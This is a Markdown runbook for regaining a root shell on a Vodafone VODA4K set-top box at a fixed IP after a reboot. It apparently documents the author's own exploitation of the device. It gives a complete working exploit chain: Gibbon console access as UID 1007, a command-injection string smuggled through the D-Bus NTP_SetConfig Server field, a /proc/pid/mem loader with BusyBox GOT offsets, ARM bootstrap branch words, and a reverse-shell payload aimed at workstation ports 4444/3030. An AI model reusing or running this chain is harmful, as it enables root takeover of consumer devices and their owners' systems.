# Vodafone VODA4K root-shell recovery runbook

Last verified: 2026-10-04. Target: `192.168.100.11`. Gibbon console: TCP
`9536`. Starting application identity: UID `1007` (`netflix`).

## Fast recovery after a reboot

Wait until TCP 9536 is accepting connections, then run from this directory:

```sh
cd /home/user/Documents/codex
./vodafone-root-shell-setup.sh 192.168.100.11 9536
./vodafone-root-shell.sh 192.168.100.11 9536
```

For a single command that performs recovery and verifies the interactive root
telnet session, use:

```sh
./vodafone-root-telnet-oneclick.sh
```

When `/mnt/usb0/busybox-armv7l` is present, the setup wrapper also remounts
the reboot-restored `noexec` `/tmp` with `exec`, copies BusyBox to
`/tmp/busybox`, and starts the verified UID-0 telnet shell on port 9080.

The setup script uploads every file lost from `/tmp`, creates the command
channels, launches the exploit, and checks `/proc/self/status`. Success must
include:

```text
Uid:    0    0    0    0
Groups: 0
CapEff: 0000003fffffffff
```

The firmware has no `id` or `head` applet. Use `/bin/cat /proc/self/status`
instead of `id` to verify credentials. Type `exit` or `quit` to close the local
client; this does not stop the root worker.

## Files required on the workstation

- `vodafone-direct-shell.sh`: converts the Gibbon TCP console into the existing
  UID-1007 `/bin/ash` channel.
- `scnet_ntp_dbus_probe.bin` and `scnet-ddexec-bootstrap.bin`: in-memory ARM
  D-Bus client and its executable-memory bootstrap.
- `vodafone-scnet-ntp-proof.sh`: uploads/runs that client and queries the NTP
  state afterward.
- `root-loader.sh`: root-stage `/proc/<pid>/mem` loader.
- `root_tcp_shell.bin` and `root-shell-bootstrap.bin`: ARM payload used by the
  root loader. Its network connection is currently expected to be blocked; the
  persistent file worker is launched independently afterward.
- `root-file-shell.sh`: persistent command worker executed by the root context.
- `vodafone-root-shell.sh`: local interactive client for the file worker.
- `vodafone-root-shell-setup.sh`: complete post-reboot orchestration.

All device-side copies are under `/tmp` and disappear at reboot. Workstation
copies in this directory are the canonical copies.

## Confirmed exploit chain

1. The Gibbon console provides shell command execution as UID 1007.
2. UID 1007 can connect to the private D-Bus socket `/tmp/sc_bus/sc_bus`.
3. The root `sc_net` service exposes
   `com.sagemcom.stb.network.NTP_SetConfig` at
   `/com/sagemcom/stb/network`.
4. Offline disassembly established the real method signature as `ua{sv}`: a
   separate scalar ID followed by the configuration dictionary. Sending only
   `a{sv}` is malformed and can fault the service.
5. The `Server` value reaches a privileged shell command without safe quoting.
   The working value is embedded in `scnet_ntp_dbus_probe.c`:

   ```text
   ntp1.vodafone.co.nz;umask 022;/bin/ash /tmp/root-loader.sh >/tmp/root-loader.log 2>&1;#
   ```

6. A benign correctly encoded call returns D-Bus status zero. Command
   injection was proven independently by creation of the root-owned
   `/tmp/scnet-root-proof`.
7. The probe waits five seconds and restores NTP server 1 to
   `ntp1.vodafone.co.nz`. `NTP_GetList` is called afterward to verify the
   restoration.
8. `root-loader.sh`, now running in the root `sc_net` context, starts and stops
   `/bin/dd`, determines its randomized BusyBox base from `/proc/<pid>/maps`,
   and uses `/proc/<pid>/mem` to install an ARM payload.
9. BusyBox-version-specific addresses used by the loader are:

   ```text
   image = base + 0x74000
   read GOT = base + 0x8fb08
   write GOT = base + 0x8fdf4
   ```

10. Both GOT entries are redirected to the payload and the stopped process is
    continued. Each `/bin/dd` write returned zero in the shell and the loader
    log confirmed successful writes.
11. `root-loader.sh` then starts `/tmp/root-file-shell.sh` as a background root
    process. It reads one command at a time from `/tmp/root-shell.in` and
    redirects output to `/tmp/root-shell.out`. Both channel files are created
    beforehand by UID 1007, so their results remain readable by UID 1007 even
    though `sc_net` normally creates files with mode 0600.
12. The local `vodafone-root-shell.sh` client octal-encodes each command,
    submits it through the UID-1007 shell, waits for the worker, and prints the
    root-owned command's output.

## Critical ARM details

- `scnet_ntp_dbus_probe.bin` is a 15,384-byte flat image.
- Its flat entry offset is `0x9a8`; `scnet-ddexec-bootstrap.s` uses branch word
  `0xea000260`.
- `root-shell-bootstrap.bin` is 36 bytes.
- The root payload starts at offset `0x24`. A branch located at offset `0x20`
  uses PC `0x28`, so the correct branch word is `0xeaffffff`.
- The earlier word `0xeafffffd` branched to offset `0x1c`, repeatedly executing
  the `mprotect` syscall instead of entering the payload. Do not restore it.
- The bootstrap invokes ARM syscall 125 (`mprotect`) with RWX permissions
  before branching to the flat payload.

## Network-shell result

The ARM network payload executes as root. `/proc/net/tcp` showed its sockets as
UID 0, but new flows remained in `SYN_SENT` toward both workstation addresses
and ports 4444/3030. A root bind listener was also inaccessible from the
workstation. The router/firewall permits the workstation-initiated established
9536 session but blocks the new shell flows. This is a transport restriction,
not a failure of root code execution. The file-backed worker is the reliable
channel and should be used after reboot.

At the time of testing, the workstation had both `192.168.0.163` and
`192.168.0.164`; the STB appeared as `192.168.100.11` through the route via
`192.168.0.2`.

## Manual recovery if the setup wrapper fails

First test the UID-1007 shell:

```sh
./vodafone-direct-shell.sh 192.168.100.11 9536
```

Use absolute paths because the appliance has a reduced BusyBox. Confirm that
`/bin/cat /proc/self/status` reports UID 1007. Then inspect
`vodafone-root-shell-setup.last.log` and verify these files exist with the
expected sizes:

```text
/tmp/root_tcp_shell.bin       348 bytes (current build)
/tmp/root_shell_bootstrap.bin 36 bytes
/tmp/root-loader.sh           843 bytes
/tmp/root-file-shell.sh       216 bytes
/tmp/root-shell.in            initially empty
/tmp/root-shell.out           initially empty
```

Run the root trigger manually:

```sh
./vodafone-scnet-ntp-proof.sh 192.168.100.11 9536
```

Then submit a credential check through the interactive client:

```sh
printf '/bin/cat /proc/self/status\nexit\n' |
  ./vodafone-root-shell.sh 192.168.100.11 9536
```

Useful device-side diagnostics from the UID-1007 shell:

```sh
/bin/ls -l /tmp/root-loader.log /tmp/root-file-shell.sh \
  /tmp/root-shell.in /tmp/root-shell.out
/bin/cat /proc/net/tcp
```

`/tmp/root-loader.log` is root-owned mode 0600, so UID 1007 can list its size
and timestamp but cannot read it directly. A refreshed timestamp proves the
NTP injection launched the root loader.

If port 9536 is not accepting connections, wait for Netflix/Gibbon to finish
starting. Rebooting erases the runtime payload and requires rerunning setup.
Avoid VCM reconfiguration while recovering this route: failed VCM tests can
take ports 2042/2043 down until another reboot, but VCM is not required for the
working `sc_net` route.

## Current artifact hashes

```text
bdb6d33a3cd96a6a58c7682caf00ad3ffb15f2ca0593903790d8d20de7a5c4fd  scnet_ntp_dbus_probe.bin
9100cfe5d836de63131725806148791a0986d07db043508367aa8328315077f2  scnet-ddexec-bootstrap.bin
35893ad269f351991f61901fc69d6c7da901b4b30ba8ac8453e756e33479339a  root-loader.sh
c26e5b94adc1220dcbe686f140c574e687d42d774de0b7127582db8c6a284d1d  root-file-shell.sh
cc5dbf22b5ae51527db1aa0fa22cb5752ddebf4307cab791defefcfd4042ff2a  root_tcp_shell.bin
72204ad6ea267aae1a08689cc0c4f881b1b46542b536707b1879948023e736ab  root-shell-bootstrap.bin
78bbe0ccc8cb342d1f48f6bbb830a832f42b6fd1ff3da346e9457473f8c0ccfc  vodafone-scnet-ntp-proof.sh
bdfba50e7f8854696b3099cf6e376dad54e2a46b4afcf5ad0ca2092fcf791cc0  vodafone-root-shell.sh
c35e08571c7fd81f7516e6945d571a93d6a3921a7761162c67055f43fef6fd1c  vodafone-root-shell-setup.sh
```

Regenerate this list after changing or rebuilding an artifact.
